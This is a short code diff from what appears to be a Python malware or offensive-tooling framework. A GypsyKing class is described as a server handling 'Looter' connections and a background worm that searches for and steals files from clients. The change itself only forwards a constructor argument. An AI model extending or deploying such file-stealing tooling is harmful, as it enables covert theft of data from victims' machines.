@@ -49,4 +49,4 @@ class GypsyKing(AdvTemplate):
     SERV_INFO = "Server to handle multiple Looter connection. Search and download files from client"
     WORM_INFO = "Runs in background. Search and Robs files from client."
     def __init__(self, ctrl_pipe: Pipe, conf: dict = {}, controlers=LooterControler):
-        super().__init__(ctrl_pipe=ctrl_pipe, conf=conf)
+        super().__init__(ctrl_pipe=ctrl_pipe, conf=conf, controlers=controlers)
